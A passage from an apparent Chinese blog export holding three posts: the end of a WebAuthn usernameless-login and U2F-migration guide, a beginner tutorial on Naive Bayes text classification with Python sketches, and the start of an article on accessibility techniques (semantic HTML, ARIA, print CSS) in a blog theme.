重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话...</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成...</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\"># 读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') # 按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") # 分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): # 判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                # 统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif word_list[0] == \"RED\":\r\n        # Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') # 按行分隔\r\ntest_data = []\r\n\r\nfor line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n    elif line_data[0] == 'RED':\r\n        # ...\r\n\r\nfor line_data in test_data:\r\n    posibility_blue = 0\r\n    for word in line_data[\"content\"]:\r\n        # 计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n        if word in word_count_blue:\r\n            posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        else:\r\n            posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n    # 最后加上该分类概率的对数\r\n    posibility_blue += math.log(len(data_blue)/(len(data_blue)+len(data_red)))\r\n\r\n    # 计算 Red 同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles - MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    